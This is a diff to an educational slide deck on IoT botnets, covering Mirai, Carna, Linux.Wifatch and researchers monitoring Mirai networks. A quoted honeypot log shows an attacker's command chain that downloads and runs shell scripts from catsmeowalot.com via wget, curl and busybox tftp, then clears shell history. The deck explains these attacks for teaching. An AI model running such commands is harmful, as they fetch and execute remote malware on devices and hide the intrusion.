@@ -69,9 +69,9 @@ ns5.spotify.com.        300     IN      A       194.68.28.185
 
 #HSLIDE
 
-##IOT
+##IoT =
 
-"connecting any device with an on and off switch to the Internet (and/or to each other). This includes everything from cellphones, coffee makers, washing machines, headphones, lamps, wearable devices and almost anything else you can think of.  This also applies to components of machines, for example a jet engine of an airplane or the drill of an oil rig."
+"= connecting any device with an on and off switch to the Internet (and/or to each other). This includes everything from cellphones, coffee makers, washing machines, headphones, lamps, wearable devices and almost anything else you can think of.  This also applies to components of machines, for example a jet engine of an airplane or the drill of an oil rig."
 
 __... what about artificial cardiac pacemaker?__
 
@@ -102,13 +102,31 @@ Mirai (Japanese for "the future") is malware that turns computer systems running
 
 #VSLIDE
 
-*Two years ago while spending some time with the Nmap Scripting Engine (NSE) someone mentioned that we should try the classic telnet login root:root on random IP addresses. This was meant as a joke, but was given a try. We started scanning and quickly realized that there should be several thousand unprotected devices on the Internet.*
+## The sotry behind Carna botnet
+
+Two years ago while spending some time with the Nmap Scripting Engine (NSE) someone mentioned that we should try the classic telnet login root:root on random IP addresses. This was meant as a joke, but was given a try. We started scanning and quickly realized that there should be several thousand unprotected devices on the Internet.
+
+#VSLIDE 
+
+## Carna Botnet client distribution March to December 2012. ~420K Clients
 
 ![Clientmap](media/clientmap_16to9_small.jpg)
 
 #VSLIDE
 
+## Internet-of-Things vigilante Linux.Wifatch
+
 ![Patched](media/Fig1_26.png)
+
+#VSLIDE
+
+## How many infected devices are there, really?
+
+It is quite hard to measure the exact size of a network that constantly changes.
+
+We enumerate the whole core network (the so-called "bn" component) multiple times a day, and the usual number of Wifatch instances is 60000 (and almost never exceeding 120000). Only these are currently being protected and disinfected.
+
+In addition, there is a much larger number of devices with a much smaller component, the so-called "tn" component. The exact number of these is very hard to measure, but it should be around 200000-300000 at any point in time.
 
 #VSLIDE
 
@@ -124,13 +142,18 @@ Uploaded for research purposes and so we can develop IoT and such.*
 2016-10-28 05:00:46+0200 login attempt [admin/qwerty] succeeded
 2016-10-28 05:00:49+0200 admin authenticated with password
 2016-10-28 05:00:50+0200 executing command "cd /tmp; 
-  wget http://catsmeowalot.com/lmao.sh || curl -O http://catsmeowalot.com/lmao.sh; 
-  chmod 777 lmao.sh; sh lmao.sh; busybox tftp catsmeowalot.com  -c get tftp1.sh; 
-  chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g catsmeowalot.com; 
-  chmod 777 tftp2.sh; sh tftp2.sh; rm -rf lmao.sh tftp1.sh tftp2.sh; cd; 
+  wget http://catsmeowalot.com/lmao.sh || 
+  curl -O http://catsmeowalot.com/lmao.sh; 
+  chmod 777 lmao.sh; sh lmao.sh; busybox 
+  tftp catsmeowalot.com  -c get tftp1.sh; 
+  chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r 
+  tftp2.sh -g catsmeowalot.com; 
+  chmod 777 tftp2.sh; sh tftp2.sh; 
+  rm -rf lmao.sh tftp1.sh tftp2.sh; cd; 
   rm -rf ./bash_history; history -c"
 2016-10-28 05:00:50+0200 Command found: history -c
-2016-10-28 05:00:50+0200 Closing TTY Log: log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
+2016-10-28 05:00:50+0200 Closing TTY Log: 
+  log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
 2016-10-28 05:00:50+0200 honeypot terminal protocol connection lost disconnected
 </pre>
 
@@ -156,11 +179,43 @@ cd /tmp && wget -q http://catsmeowalot.com/ayyx86 &&
 
 #VSLIDE
 
+## Grow botnet ...
+![grow](media/8b0ff6a124324391a33ca3381ecbe358.png)
+
+#VSLIDE
+
+## ATTACK!!!
+![grow](media/e01728cc15444e3a8ccca73e0cd61775.png)
+
+#VSLIDE
+
+## ATTACK!!!
+![grow](media/e8f97f28ef5c412cbd7eb036725f2ced.png)
+
+#VSLIDE
+
 ## Meet the Whitehat! 
 
 ![Whitehat](media/malwaretech.png)
 
 #VSLIDE
+
+## @Malwaretech monitors Mirai networks
+
+After the source code was released many new botherders appeared ...
+
+<pre>
+Skiddy
+A variation of the word Script Kidddy.
+
+Somone who 'hacks' using scripts/programs that other
+people have written to aid them, having no knowladge
+of computer systems whatsoever. 
+</pre>
+
+#VSLIDE
+
+![wordsofwisdom](media/cybergibbons_about_mirai.png)
 
 #VSLIDE
 
